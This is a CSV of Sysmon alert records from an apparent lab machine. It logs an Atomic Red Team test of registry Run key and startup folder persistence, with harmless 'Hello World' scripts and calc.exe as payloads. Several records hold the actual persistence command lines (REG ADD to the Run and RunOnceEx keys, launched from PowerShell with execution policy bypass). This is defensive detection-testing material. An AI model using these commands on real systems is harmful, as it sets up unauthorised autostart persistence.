"2025-12-26 11:19:19.904 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173652,"Rule: T1042 ¦ EventType: SetValue ¦ TgtObj: HKCR\Directory\background\shell\Size Modify\command\(Default) ¦ C:\Windows\System32\calc.exe ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 2484 ¦ PGUID: E9F06A57-6127-694E-A901-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:19.903","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:21.058 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173653,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotibatstartup.bat ¦ DWORD (0x00000004) ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:21.058","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:21.116 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173654,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc_exe.lnk ¦ DWORD (0x00000004) ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:21.115","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:21.131 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173655,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotijsestartup.jse ¦ DWORD (0x00000004) ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:21.129","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:21.140 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173656,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotisocks5_powershell ¦ DWORD (0x00000001) ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:21.139","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:21.150 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173657,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotivbsstartup.vbs ¦ DWORD (0x00000004) ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:21.149","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:27.786 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173658,"Rule: T1042 ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.exe\OpenWithProgids\exefile ¦ Binary Data ¦ Proc: C:\WINDOWS\Explorer.EXE ¦ PID: 5088 ¦ PGUID: E9F06A57-5FF3-694E-8300-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:27.780","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:31.175 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173659,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc ¦ DWORD (0x00000000) ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:31.174","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:31.311 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173660,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc.exe ¦ DWORD (0x00000003) ¦ Proc: C:\WINDOWS\System32\sihost.exe ¦ PID: 4260 ¦ PGUID: E9F06A57-5FEE-694E-6400-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:31.306","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:50.733 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173670,"Rule: T1042 ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003_Classes\CLSID\{2cc5ca98-6485-489a-920e-b3e88a6ccce3}\shell\SpotlightClick\command\DelegateExecute ¦ {4813071a-41ad-44a2-9835-886d2f63ca30} ¦ Proc: C:\WINDOWS\Explorer.EXE ¦ PID: 5088 ¦ PGUID: E9F06A57-5FF3-694E-8300-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:50.722","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.431 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173571,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Hash: MD5=B6DEC52AB53E705337526758B05E4A3C,SHA256=52D464FCC5B72D50B169A45ED8FDEF22792C3FCB683F598B6E605336E53EAF78,IMPHASH=00000000000000000000000000000000","Contents: WScript.Echo(""T1547.001 Hello, World VBS!"") ¦ CreationUtcTime: 2025-12-26 10:18:54.425 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.427","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.432 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173573,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:54.425 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.431","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.436 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173575,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Hash: MD5=B6DEC52AB53E705337526758B05E4A3C,SHA256=52D464FCC5B72D50B169A45ED8FDEF22792C3FCB683F598B6E605336E53EAF78,IMPHASH=00000000000000000000000000000000","Contents: WScript.Echo(""T1547.001 Hello, World VBS!"") ¦ CreationUtcTime: 2025-12-26 10:18:54.433 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.433","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.436 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173577,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:54.433 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.435","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.806 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173583,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Hash: MD5=D2A9012AA801CBF9027BAE6A39ABB07E,SHA256=E555D0A923B2090E9A4937D658F92CEEF18E1F63ED7C00726E7A965176657C3F,IMPHASH=00000000000000000000000000000000","Contents: WScript.Echo(""T1547.001 Hello, World JSE!"") ¦ CreationUtcTime: 2025-12-26 10:18:55.802 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.803","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.812 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173585,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:55.802 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.807","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.812 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173587,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Hash: MD5=D2A9012AA801CBF9027BAE6A39ABB07E,SHA256=E555D0A923B2090E9A4937D658F92CEEF18E1F63ED7C00726E7A965176657C3F,IMPHASH=00000000000000000000000000000000","Contents: WScript.Echo(""T1547.001 Hello, World JSE!"") ¦ CreationUtcTime: 2025-12-26 10:18:55.809 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.811","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.813 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173589,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:55.809 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.811","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.603 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173596,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Hash: MD5=BEA90A411BE634A08E21E4F938ACF38E,SHA256=F7235DE2940ED81A2202170AF9873DDBA606192E5809996360BBF3548855F1CE,IMPHASH=00000000000000000000000000000000","Contents: echo "" T1547.001 Hello World Bat"" ¦ CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.601","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.610 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173598,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.603","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.620 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173600,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Hash: MD5=BEA90A411BE634A08E21E4F938ACF38E,SHA256=F7235DE2940ED81A2202170AF9873DDBA606192E5809996360BBF3548855F1CE,IMPHASH=00000000000000000000000000000000","Contents: echo "" T1547.001 Hello World Bat"" ¦ CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.613","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.621 +01:00","ADS Created","info","DESKTOP-G2OBL3D","Sysmon",15,"","","sysmon",173602,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ Hash: MD5=87A774F5DB268320B316AFC6266507F2,SHA256=926CAEFCC44849119F08D11EE4CBE87E1DDA2D22AA5A5E9C16DD7547CD04179C,IMPHASH=00000000000000000000000000000000","Contents: [ZoneTransfer] ZoneId=3 ReferrerUrl=C:\AtomicRedTeam\atomic-red-team-master.zip ¦ CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.615","Sysmon_15_Info_ADS-Created.yml","046cac6f-d622-4044-ae0c-1bdbad6210f9","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:40.641 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173555,"Cmdline: taskhostw.exe ¦ Proc: C:\Windows\System32\taskhostw.exe ¦ User: NT AUTHORITY\SYSTEM ¦ ParentCmdline: C:\WINDOWS\System32\svchost.exe -k netsvcs -p ¦ LID: 0x3e7 ¦ LGUID: E9F06A57-5FE0-694E-E703-000000000000 ¦ PID: 3624 ¦ PGUID: E9F06A57-6100-694E-6601-000000002400 ¦ ParentPID: 1400 ¦ ParentPGUID: E9F06A57-5FE2-694E-1C00-000000002400 ¦ Description: Host Process for Windows Tasks ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3979F5BBEC9B7637719F9A096400A24A,SHA256=CAAAFB0C6F77CD37F402E644FC56B7D89E3D5FC51E128A4AC49481D281E582F8,IMPHASH=2196268E7A2880E3ADC74481297D0C4B","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: System ¦ ParentImage: C:\Windows\System32\svchost.exe ¦ RuleName: - ¦ TerminalSessionId: 0 ¦ UtcTime: 2025-12-26 10:18:40.628","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:44.301 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173556,"Cmdline: ""C:\WINDOWS\system32\HOSTNAME.EXE"" ¦ Proc: C:\Windows\System32\HOSTNAME.EXE ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1252 ¦ PGUID: E9F06A57-6104-694E-6701-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Hostname APP ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2161 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: hostname.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:44.297","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:44.376 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173557,"Cmdline: ""C:\WINDOWS\system32\whoami.exe"" ¦ Proc: C:\Windows\System32\whoami.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7732 ¦ PGUID: E9F06A57-6104-694E-6801-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: whoami - displays logged on user information ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: whoami.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:44.354","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:45.176 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173558,"Cmdline: ""cmd.exe"" /c REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6604 ¦ PGUID: E9F06A57-6105-694E-6901-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:45.152","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:45.379 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173559,"Cmdline: REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 2516 ¦ PGUID: E9F06A57-6105-694E-6B01-000000002400 ¦ ParentPID: 6604 ¦ ParentPGUID: E9F06A57-6105-694E-6901-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:45.371","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.375 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173561,"Cmdline: ""cmd.exe"" /c REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 840 ¦ PGUID: E9F06A57-6109-694E-6C01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.365","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
